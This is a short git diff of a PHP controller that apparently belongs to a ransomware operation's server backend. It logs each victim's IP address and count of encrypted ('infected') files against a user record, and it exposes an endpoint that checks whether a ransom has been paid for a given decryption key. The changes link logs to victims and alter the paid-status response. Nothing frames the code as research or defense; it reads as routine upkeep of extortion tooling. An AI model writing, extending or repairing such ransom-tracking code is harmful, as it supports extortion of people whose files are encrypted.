@@ -54,6 +54,7 @@ class UserController extends BaseController
             $this->userRepository->save($user, true);
 
             $log = (new Log)
+                ->setUser($user)
                 ->setIp($data['ip']);
 
             if(array_key_exists('encryptedFiles', $data)) $log->setNumberInfectedFile($data['encryptedFiles']);
@@ -142,7 +143,7 @@ class UserController extends BaseController
      */
     public function isPaied(string $decryptKey) {
         try {
-            return  $this->json(['is_paied' => $this->userService->isPaied($decryptKey)]);
+            return  $this->json($this->userService->isPaied($decryptKey));
         } catch (\Throwable $th) {
             return $this->failure($th->getMessage());
         }
